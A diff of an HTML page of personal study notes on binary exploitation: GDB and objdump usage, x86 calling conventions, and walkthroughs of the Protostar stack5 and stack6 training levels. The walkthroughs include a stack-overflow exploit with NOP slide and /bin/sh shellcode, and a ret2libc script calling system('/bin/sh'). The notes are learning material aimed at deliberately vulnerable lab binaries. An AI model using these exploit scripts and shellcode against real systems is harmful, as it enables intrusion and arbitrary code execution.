@@ -280,14 +280,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#gdb" class="md-nav__link">
-    GDB
-  </a>
-  
-    <nav class="md-nav" aria-label="GDB">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#learning-sources" class="md-nav__link">
     Learning Sources
   </a>
@@ -302,14 +294,9 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#basic-disassembler-and-register-tricks" class="md-nav__link">
-    Basic disassembler and register tricks
+  <a href="#gdb" class="md-nav__link">
+    GDB
   </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
         
@@ -349,6 +336,20 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#calling-convention" class="md-nav__link">
+    Calling Convention:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#end-of-a-function" class="md-nav__link">
+    End of a Function
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#protostar" class="md-nav__link">
     Protostar
   </a>
@@ -359,6 +360,13 @@
           <li class="md-nav__item">
   <a href="#stack5" class="md-nav__link">
     stack5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stack6" class="md-nav__link">
+    stack6
   </a>
   
 </li>
@@ -395,7 +403,6 @@
                 
                 <h1 id="security-learning-note">Security Learning Note<a class="headerlink" href="#security-learning-note" title="Permanent link">&para;</a></h1>
 <h2 id="binary-exploitation">Binary Exploitation<a class="headerlink" href="#binary-exploitation" title="Permanent link">&para;</a></h2>
-<h3 id="gdb">GDB<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h3>
 <h4 id="learning-sources">Learning Sources<a class="headerlink" href="#learning-sources" title="Permanent link">&para;</a></h4>
 <ul>
 <li><a href="https://www.youtube.com/watch?v=VroEiMOJPm8&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=7&amp;t=0s">LiveOverflow Youtube channel</a></li>
@@ -405,7 +412,7 @@
 <li><code>file</code>: determine file type</li>
 <li><code>strings</code>: print the sequences of printable characters in files</li>
 </ul>
-<h4 id="basic-disassembler-and-register-tricks">Basic disassembler and register tricks<a class="headerlink" href="#basic-disassembler-and-register-tricks" title="Permanent link">&para;</a></h4>
+<h4 id="gdb">GDB<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h4>
 <ul>
 <li><code>set disassembly-flavor intel</code>: a more readable style</li>
 <li><code>disassemble main</code>: display all assembler instructions of the <code>main</code> function</li>
@@ -413,13 +420,17 @@
 <li><code>si</code>: step one instruction</li>
 <li><code>info registers</code>:<ul>
 <li><code>rip / eip</code>: instruction pointer (program counter)</li>
+<li><code>rsp / esp</code>: stack pointer</li>
 <li><code>eax</code>: the first 32 bits of the 64-bit <code>rax</code> register</li>
 </ul>
 </li>
 <li><code>set $eax=0</code>: set the register <code>eax</code> to 0</li>
 <li><code>info proc mapping</code>: report the memory address space ranges accessible in a process.</li>
-<li>x command: examine the content of a memory address <a href="https://visualgdb.com/gdbreference/commands/x">reference</a></li>
-<li>define a "hook", example:
+<li>x command: examine the content of a memory address <a href="https://visualgdb.com/gdbreference/commands/x">reference</a><ul>
+<li><code>x/4wx $esp</code></li>
+</ul>
+</li>
+<li>define a "hook", for example, <em>hook-stop</em> will execute when the program stop at a breakpoint:
   <div class="highlight"><pre><span></span><code>(gdb) define hook-stop
 Type commands for definition of &quot;hook-stop&quot;.
 End with a line saying just &quot;end&quot;.
@@ -433,6 +444,7 @@ End with a line saying just &quot;end&quot;.
 <ul>
 <li><code>objdump -d $FILENAME</code>: disassembler</li>
 <li><code>objdump -x $FILENAME</code>: print header information</li>
+<li><code>objdump -t $FILENAME</code>: print the symbol table entries, can be used to find the address of a function</li>
 </ul>
 <h3 id="strace-ltrace">strace &amp; ltrace<a class="headerlink" href="#strace-ltrace" title="Permanent link">&para;</a></h3>
 <ul>
@@ -451,42 +463,45 @@ End with a line saying just &quot;end&quot;.
 <ul>
 <li>ebp / rbp: contains the address of the bottom of the stack</li>
 <li>esp / rsp: contains the address the top of the stack</li>
-<li>
-<p>When enter a function:
-    <div class="highlight"><pre><span></span><code>push   ebp
-mov    ebp,esp
-and    esp,0xfffffff0
-</code></pre></div>
-  (mask out the last 4 bits of esp is for alignment)</p>
-</li>
-<li>
-<p>Procedures of calling a function:</p>
+</ul>
+<h3 id="calling-convention">Calling Convention:<a class="headerlink" href="#calling-convention" title="Permanent link">&para;</a></h3>
 <ol>
-<li>(old func) push the paramters to be passed on the stack</li>
-<li>(old func) push the next instruction to be executed on the stack</li>
-<li>(old func) execute <code>`call</code> instruction</li>
-<li>(new func) push the value of <em>ebp</em> on the stack</li>
-<li>(new func) set <em>ebp</em> to the value of <em>esp</em></li>
-<li>(new func) align the value of <em>esp</em></li>
-<li>(new func) substract <em>esp</em> to create stack frame</li>
+<li>push the paramters to be passed on the stack (in reverse order)</li>
+<li><code>call</code> instruction<ol>
+<li>push the return address on the stack</li>
+<li>set <code>eip (rip)</code> to the address of the callee </li>
 </ol>
 </li>
-<li>
-<p>Procedures of returning from a function:</p>
+<li>push the value of <code>ebp</code> on the stack</li>
+<li>set <code>ebp</code> to the value of <code>esp</code></li>
+<li>align the value of <code>esp</code> (bitwise and with 0xfffffff0)</li>
+<li>substract <code>esp</code> by a certain value to create the stack frame</li>
+</ol>
+<h3 id="end-of-a-function">End of a Function<a class="headerlink" href="#end-of-a-function" title="Permanent link">&para;</a></h3>
 <ol>
 <li><code>leave</code> instruction: <code>mov esp, ebp</code> then <code>pop ebp</code></li>
-<li><code>ret</code> instruction: get the next instruction pointer, which is on the top of the stack (pop)</li>
+<li><code>ret</code> instruction (the invert of <code>call</code> instruction): get and set the next instruction pointer, which is on the top of the stack </li>
 </ol>
-</li>
-</ul>
-<h3 id="protostar">Protostar<a class="headerlink" href="#protostar" title="Permanent link">&para;</a></h3>
+<h3 id="protostar"><a href="https://exploit.education/protostar/">Protostar</a><a class="headerlink" href="#protostar" title="Permanent link">&para;</a></h3>
 <h4 id="stack5"><a href="https://exploit.education/protostar/stack-five/">stack5</a><a class="headerlink" href="#stack5" title="Permanent link">&para;</a></h4>
 <ol>
-<li>calculate the length of padding</li>
-<li>determine the value of <em>ebp</em> (does not matter in this problem)</li>
-<li>determine the value of <em>eip</em>: where to place our shell code? (right after <em>$eip</em>)</li>
-<li>add NOP(opcode: <code>0x90</code>) slide: the address may not be the same every time since the data pushed on the stack can be different (e.g. environment variables)<ul>
-<li>make the <em>eip</em> point to the middle of the NOP slide (the exact position is not sure)</li>
+<li>First analyze the disassembled code:
+<div class="highlight"><pre><span></span><code>0x080483c4 &lt;main+0&gt;:    push   ebp
+0x080483c5 &lt;main+1&gt;:    mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:    sub    esp,0x50
+0x080483cd &lt;main+9&gt;:    lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:   mov    DWORD PTR [esp],eax
+0x080483d4 &lt;main+16&gt;:   call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:   leave  
+0x080483da &lt;main+22&gt;:   ret    
+</code></pre></div>
+The goal is to smash the stack frame of <code>gets</code> and redirect the return address to <code>execve("/bin/sh")</code> at the return of main function.</li>
+<li>From the assembly code, we know the buffer starts at <code>$esp+0x10</code>, whose value can be found by GDB.</li>
+<li>To know the size of padding, we need to know <code>$esp</code> when <code>0x080483da &lt;main+22&gt;:   ret</code> is executed. We can find it out by setting a breakpoint at <code>ret</code> and <code>x/wx $esp</code>. Now we know that the padding should be 76 bytes long. (actually the last 4 bytes is the old <code>ebp</code>, but it does not matter here)</li>
+<li>determine the value of <code>eip</code>: Where to place our shell code? Here we choose to place it right after the position of <code>eip</code></li>
+<li>However, the address space may not be the same every time since the data pushed on the stack can be different (e.g. environment variables). To address this issue, we can find a way to know the exact value by the other code in the binary. However, we can also use NOP(opcode: <code>0x90</code>) slide to make sure that <code>eip</code> points to the code we control. <ul>
+<li>make the <em>eip</em> point to the middle of the NOP slide</li>
 </ul>
 </li>
 <li>add shellcode: copy from <a href="http://shell-storm.org/shellcode/">shell-storm</a></li>
@@ -497,19 +512,70 @@ and    esp,0xfffffff0
 </div>
 <div class="admonition warning">
 <p class="admonition-title">Warning</p>
-<p><code>python exploit.py | /opt/protostar/bin/stack5</code> does not work because when exploit.py terminates, the pipe is closed at the mean time. Thus, we should use <code>cat</code> to create a new pipe:
+<p><code>python exploit.py | /opt/protostar/bin/stack5</code> does not work because stack5's stdin has been redirected to the stdout of exploit.py. When the shell gets executed, it reads nothing but the EOF of the stdout of exploit.py. As a result, the shell does not read any input from our terminal. A possible solution is using <code>cat</code> to "continue" the pipe and pipe our commands into the stdin of the shell.
 <div class="highlight"><pre><span></span><code><span class="o">(</span>python exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> /opt/protostar/bin/stack5
 </code></pre></div></p>
 </div>
+<p>Python2 Script:
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span>
 
-<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span>
-<span class="n">ebp</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">76</span>
 <span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xbffff6e0</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span>
 <span class="n">nopslide</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">100</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s2">&quot;</span>
-<span class="nb">print</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ebp</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nopslide</span> <span class="o">+</span> <span class="n">shellcode</span>
-</code></pre></div>
+<span class="nb">print</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nopslide</span> <span class="o">+</span> <span class="n">shellcode</span>
+</code></pre></div></p>
+<h4 id="stack6"><a href="https://exploit.education/protostar/stack-six/">stack6</a><a class="headerlink" href="#stack6" title="Permanent link">&para;</a></h4>
+<p>In this task, the return address is restricted so we cannot just set it to an address on the stack. Instead, we take use of the code of <code>libc</code>. The goal is to call <code>system()</code> with <code>/bin/sh</code> as the argument. This is a attack method called <strong>ret2libc</strong>.</p>
+<ul>
+<li>
+<p>How to call <code>system()</code></p>
+<ol>
+<li>push the argument ("/bin/sh") on the stack</li>
+<li>push the return address on the stack</li>
+<li>jump to <code>system</code></li>
+</ol>
+</li>
+<li>
+<p>Thus, when <code>ret</code> instruction jump to <code>system</code>, the stack should be as follow:
+    <div class="highlight"><pre><span></span><code>-----------------------------
+ return address after system  &lt;---- esp
+-----------------------------
+     address of &quot;/bin/sh&quot;
+-----------------------------
+</code></pre></div></p>
+</li>
+<li>And our buffer overflow should make the stack be as follow:
+    <div class="highlight"><pre><span></span><code>-----------------------------
+         padding
+-----------------------------
+     address of system
+-----------------------------
+ return address after system 
+-----------------------------
+     address of &quot;/bin/sh&quot;
+-----------------------------
+</code></pre></div></li>
+<li>
+<p>script:
+    <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">80</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>
+<span class="n">return_after_system</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xb7fb63bf</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">return_after_system</span> <span class="o">+</span> <span class="n">bin_sh</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>find the address of <code>system</code>: in GDB type <code>p system</code></p>
+</li>
+<li>find the address of "/bin/sh"<ol>
+<li>use environment variables</li>
+<li>find in libc: <code>string -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"</code> + the start address of libc in the program's memory mapping.</li>
+</ol>
+</li>
+</ul>
                 
               
               
